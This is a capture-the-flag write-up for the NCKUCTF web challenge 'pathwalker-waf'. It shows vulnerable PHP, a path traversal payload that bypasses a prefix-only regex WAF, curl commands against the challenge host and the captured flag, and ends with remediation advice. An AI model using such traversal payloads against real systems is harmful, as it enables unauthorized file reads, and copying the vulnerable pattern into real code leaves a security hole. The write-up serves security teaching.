# Pathwalker-Waf




{{< admonition tldr "TL;DR" >}}

**pathwalker-waf** is a web challenge from **NCKUCTF**. * **Challenge Name** : pathwalker-waf * **Category** : WEB * **Organizer** : NCKUCTF * **Writeup Author** : spawn2pwn

{{< /admonition >}}

## **1. Identity Challenge**

* **Challenge Name** : pathwalker-waf
* **Category** : WEB
* **Organizer** : NCKUCTF
* **Writeup Writer** : spawn2pwn

---

## **2. Problem Description**

This challenge is a development of the previous challenge (*pathwalker*) with the addition of a protection mechanism in the form of a simple WAF.

Users are only allowed to access certain pages via the `page` parameter, namely:

*apples
*bananas
*cappo

The objective of this challenge is to still get FLAG despite these restrictions.

---

## **3. System Analysis**

Main source code:

```php
if (isset($_GET['page'])) {
    $lowercaseComponent = strtolower($_GET['page']);
    $pattern_file = "/^(apple|banana|cappo)/";
    if (preg_match($pattern_file, $lowercaseComponent)) {
        echo file_get_contents("./page/".$lowercaseComponent.".php");
    } else {
        echo "<p>bad hecker detect! </p>";
    }
}
```

### Mechanisms:

1. Input `page` is changed to lowercase
2. Checked using regex:

```
   /^(apple|banana|cappo)/
   ```

3. If match → file read:

```
   ./page/{input}.php
   ```

---

## **4. Identify Vulnerabilities**

Even though there is a WAF, the validation carried out is **not strict**.

Main problems:

> **Regex only checks the prefix (start of the string), not the entire input**

So:

```text
apple/../../flag
```

Still passed because:

* starts with `apple` → match regex
* but after that you can do traversal

These causes:

> **WAF Bypass + Path Traversal**

---

## **5. Exploitation Methodology**

### **5.1 WAF Bypass**

Payloads:

```bash
?page=apple/../../flag
```

Explanation:

* `apple` → escaped regex
* `/../../flag` → exit directory `/page` Path formed:

```
./page/apple/../../flag.php
→ ./flag.php
```

---

### **5.2 Sending Request**

```bash
curl https://chall.nckuctf.org:28110/?page=apple/../../flag
```

---

### **5.3 Flag Extraction**

```bash
curl -s "https://chall.nckuctf.org:28110/?page=apple/../../flag" | grep -o "NCKUCTF{.*}"
```

---

## **6. Exploitation Results**

FLAG was successfully obtained:

```
NCKUCTF{p47h_724v32541_h45_4107_721ck}
```

---

## **7. Discussion**

The primary vulnerability:

1. **Regex does not use final anchor `$` **

```regex
   /^(apple|banana|cappo)/
   ```

It should be:

```regex
   /^(apple|banana|cappo)$/
   ```

2. **No traversal character sanitization ( `../` )**

3. **Directly combine input to path**

As a result:

* WAF can be bypassed with the prefix injection technique
* Path traversal can still be done

---

## **8. Improvement Recommendations**

1. **Fix Regex**

```php
$pattern_file = "/^(apple|banana|cappo)$/";
```

2. **Use Whitelist**

```php
$allowed = ['apple','banana','cappo'];
if (!in_array($lowercaseComponent, $allowed)) {
    die("Invalid input");
}
```

3. **Use realpath()**

```php
$base = realpath('./page/');
$file = realpath($base . '/' . $lowercaseComponent . '.php');

if (strpos($file, $base) !== 0) {
    die("Traversal detected");
}
```

---

## **9. Conclusion**

This challenge shows that:

> A simple regex-based WAF can be easily bypassed if it doesn't validate the entire input

By adding a payload after a valid prefix, an attacker can perform path traversal and access sensitive files such as FLAG.

---

## **10. Attachments**

### **Source Code**

```php
if (isset($_GET['page'])) {
    $lowercaseComponent = strtolower($_GET['page']);
    $pattern_file = "/^(apple|banana|cappo)/";
    if (preg_match($pattern_file, $lowercaseComponent)) {
        echo file_get_contents("./page/".$lowercaseComponent.".php");
    } else {
        echo "<p>bad hecker detect! </p>";
    }
}
```

---

### **Exploit Request**

```bash
curl https://chall.nckuctf.org:28110/?page=apple/../../flag
```

---

### **FLAG Extraction**

```bash
curl -s "https://chall.nckuctf.org:28110/?page=apple/../../flag" | grep -o "NCKUCTF{.*}"
```


---

> Author: [spawn2pwn](https://github.com/nfl-alvis)  
> URL: https://ctf.spawn2pwn.my.id/posts/pathwalker-waf/  

